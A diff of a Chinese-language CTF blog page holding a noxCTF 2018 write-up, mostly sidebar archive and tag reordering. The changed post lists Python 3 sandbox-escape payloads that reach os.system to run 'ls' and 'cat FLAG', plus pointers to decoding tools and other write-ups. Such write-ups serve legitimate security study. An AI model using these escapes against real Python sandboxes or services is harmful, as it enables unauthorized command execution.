@@ -372,11 +372,11 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p><a href="https://ctftime.org/event/671/tasks/" target="_blank" rel="noopener">https://ctftime.org/event/671/tasks/</a><br>我就是单纯地想自己写一遍<em>(:з」∠)</em></p>
+        <p><a href="https://ctftime.org/event/671/tasks/" target="_blank" rel="noopener">https://ctftime.org/event/671/tasks/</a><br>我就是单纯地想自己写一遍<em>(:з」∠)</em><br><code>https://ctftime.org/event/671/tasks/</code></p>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Python-for-fun"><a href="#Python-for-fun" class="headerlink" title="Python for fun"></a>Python for fun</h2><p>python3沙盒绕过，没有waf。<br>本地实验：<br>(题目要求填写fun()的参数)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(a,b=<span class="params">(print<span class="params">(__import__<span class="params">(<span class="string">'os'</span>)</span>.system<span class="params">(<span class="string">'ls'</span>)</span>)</span>)</span>)</span>:</span></span><br><span class="line">    c=a+b</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">fun(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p>
 <p>result:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BlindDate.jpeg</span><br><span class="line">flag.jpeg</span><br><span class="line">test.py</span><br><span class="line">test1.py</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Python-for-fun-2"><a href="#Python-for-fun-2" class="headerlink" title="Python for fun 2"></a>Python for fun 2</h2><p>与上题相比多了waf，无法使用<strong>import</strong>等方法，网上沙盒绕过大多是python2，不适用于python3，此处给出几种payload，来自4uuu Nya和其他选手<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a,b=(print(().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;)))</span><br><span class="line">a = print(().__ class __.__ bases__[0].__ subclasses__()[93].__init__.__ globals__[&quot;sys&quot;].modules [&quot;os&quot;].system(&quot;ls&quot;))，b = 1</span><br><span class="line"></span><br><span class="line">&apos;&apos;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;cat FLAG&quot;)</span><br><span class="line"></span><br><span class="line">a,b,c=print([].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;cat FLAG&apos;))</span><br></pre></td></tr></table></figure></p>
-<p>PS:可能由于本地是python3.7版本过高的原因，本地实验未成功，暂未确定payload作用版本区间。</p>
+<p>PS:python3各个小版本之间payload也有不同。</p>
 <h2 id="Blind-Date"><a href="#Blind-Date" class="headerlink" title="Blind Date"></a>Blind Date</h2><p>没想到用strings<br><a href="https://github.com/imthoe/noxCTF/tree/master/BlindDate" target="_blank" rel="noopener">https://github.com/imthoe/noxCTF/tree/master/BlindDate</a></p>
 <h2 id="Read-Between-The-Lines"><a href="#Read-Between-The-Lines" class="headerlink" title="Read Between The Lines"></a>Read Between The Lines</h2><p>前半段是jsfuck代码，后半段是whitespace代码，在mac上还真没看出来，windows下用notepad比较好分辨，jsfuck解密出来无重要信息，whitespace解密后得到flag。<br>jsfuck解密：<a href="http://codertab.com/JsUnFuck" target="_blank" rel="noopener">http://codertab.com/JsUnFuck</a><br>whitespace ide: <a href="http://vii5ard.github.io/whitespace/" target="_blank" rel="noopener">http://vii5ard.github.io/whitespace/</a>或者<a href="https://tio.run/#whitespace" target="_blank" rel="noopener">https://tio.run/#whitespace</a></p>
 <h2 id="Slippery-Situation"><a href="#Slippery-Situation" class="headerlink" title="Slippery Situation"></a>Slippery Situation</h2><p>收获工具:<a href="https://github.com/ptoomey3/evilarc" target="_blank" rel="noopener">evilarc</a><br><a href="https://www.pwndiary.com/write-ups/noxctf-2018-slippery-situation-write-up-misc750/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-slippery-situation-write-up-misc750/</a></p>
@@ -1541,22 +1541,7 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    <div class="total-archive"> Total : 62 </div>
+    <div class="total-archive"> Total : 63 </div>
     
     <div class="post-archive">
     
@@ -1565,6 +1550,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2018/09/17/CSAW-CTF-2018-Writeup/" >CSAW CTF 2018 Writeup</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1842,12 +1832,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Python实现AES/" >Python实现AES_128_CBC&OFB</a>
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Python实现RC4及A5/" >Python实现RC4及A5</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Python实现RC4及A5/" >Python实现RC4及A5</a>
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href= "/2017/12/15/Python实现AES/" >Python实现AES_128_CBC&OFB</a>
         </li>
     
     
@@ -1901,45 +1891,47 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="图像处理"><span class="iconfont-archer">&#xe606;</span>图像处理</span>
     
-        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
-    
-        <span class="sidebar-tag-name" data-tags="ECC"><span class="iconfont-archer">&#xe606;</span>ECC</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="Reverse"><span class="iconfont-archer">&#xe606;</span>Reverse</span>
     
         <span class="sidebar-tag-name" data-tags="PWN"><span class="iconfont-archer">&#xe606;</span>PWN</span>
     
+        <span class="sidebar-tag-name" data-tags="ECC"><span class="iconfont-archer">&#xe606;</span>ECC</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
+    
         <span class="sidebar-tag-name" data-tags="Padding Orlace"><span class="iconfont-archer">&#xe606;</span>Padding Orlace</span>
     
-        <span class="sidebar-tag-name" data-tags="DES"><span class="iconfont-archer">&#xe606;</span>DES</span>
-    
-        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
-    
         <span class="sidebar-tag-name" data-tags="RC4,A5"><span class="iconfont-archer">&#xe606;</span>RC4,A5</span>
+    
+        <span class="sidebar-tag-name" data-tags="DES"><span class="iconfont-archer">&#xe606;</span>DES</span>
     
         <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
     
         <span class="sidebar-tag-name" data-tags="hello"><span class="iconfont-archer">&#xe606;</span>hello</span>
     
-        <span class="sidebar-tag-name" data-tags="Rsa"><span class="iconfont-archer">&#xe606;</span>Rsa</span>
-    
-        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
-    
         <span class="sidebar-tag-name" data-tags="Vigenere"><span class="iconfont-archer">&#xe606;</span>Vigenere</span>
+    
+        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
     
         <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
     
+        <span class="sidebar-tag-name" data-tags="漏洞复现"><span class="iconfont-archer">&#xe606;</span>漏洞复现</span>
+    
+        <span class="sidebar-tag-name" data-tags="Rsa"><span class="iconfont-archer">&#xe606;</span>Rsa</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
         <span class="sidebar-tag-name" data-tags="人类观察"><span class="iconfont-archer">&#xe606;</span>人类观察</span>
+    
+        <span class="sidebar-tag-name" data-tags="matplotlib"><span class="iconfont-archer">&#xe606;</span>matplotlib</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
     
         <span class="sidebar-tag-name" data-tags="hash扩展攻击"><span class="iconfont-archer">&#xe606;</span>hash扩展攻击</span>
     
-        <span class="sidebar-tag-name" data-tags="matplotlib"><span class="iconfont-archer">&#xe606;</span>matplotlib</span>
-    
-        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+        <span class="sidebar-tag-name" data-tags="root-me"><span class="iconfont-archer">&#xe606;</span>root-me</span>
     
         <span class="sidebar-tag-name" data-tags="菜猫的无能狂怒"><span class="iconfont-archer">&#xe606;</span>菜猫的无能狂怒</span>
     
@@ -1947,19 +1939,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php审计"><span class="iconfont-archer">&#xe606;</span>php审计</span>
     
-        <span class="sidebar-tag-name" data-tags="root-me"><span class="iconfont-archer">&#xe606;</span>root-me</span>
+        <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
     
         <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
     
-        <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
+        <span class="sidebar-tag-name" data-tags="仿射加密"><span class="iconfont-archer">&#xe606;</span>仿射加密</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
-        <span class="sidebar-tag-name" data-tags="仿射加密"><span class="iconfont-archer">&#xe606;</span>仿射加密</span>
+        <span class="sidebar-tag-name" data-tags="记录一些思路脚本什么的"><span class="iconfont-archer">&#xe606;</span>记录一些思路脚本什么的</span>
     
         <span class="sidebar-tag-name" data-tags="无产阶级之怒"><span class="iconfont-archer">&#xe606;</span>无产阶级之怒</span>
-    
-        <span class="sidebar-tag-name" data-tags="记录一些思路脚本什么的"><span class="iconfont-archer">&#xe606;</span>记录一些思路脚本什么的</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1996,29 +1986,29 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="图像处理"><span class="iconfont-archer">&#xe60a;</span>图像处理</span>
     
-        <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
-    
-        <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
-    
         <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
         <span class="sidebar-category-name" data-categories="Writeup"><span class="iconfont-archer">&#xe60a;</span>Writeup</span>
     
         <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
     
+        <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
+    
+        <span class="sidebar-category-name" data-categories="笔记"><span class="iconfont-archer">&#xe60a;</span>笔记</span>
+    
         <span class="sidebar-category-name" data-categories="机器学习"><span class="iconfont-archer">&#xe60a;</span>机器学习</span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞复现"><span class="iconfont-archer">&#xe60a;</span>漏洞复现</span>
     
         <span class="sidebar-category-name" data-categories="Writeup/Crypto"><span class="iconfont-archer">&#xe60a;</span>Writeup/Crypto</span>
     
-        <span class="sidebar-category-name" data-categories="漏洞复现"><span class="iconfont-archer">&#xe60a;</span>漏洞复现</span>
+        <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
+    
+        <span class="sidebar-category-name" data-categories="matplotlib"><span class="iconfont-archer">&#xe60a;</span>matplotlib</span>
     
         <span class="sidebar-category-name" data-categories="docker"><span class="iconfont-archer">&#xe60a;</span>docker</span>
     
         <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
-    
-        <span class="sidebar-category-name" data-categories="matplotlib"><span class="iconfont-archer">&#xe60a;</span>matplotlib</span>
-    
-        <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
     
         <span class="sidebar-category-name" data-categories="numpy"><span class="iconfont-archer">&#xe60a;</span>numpy</span>
     
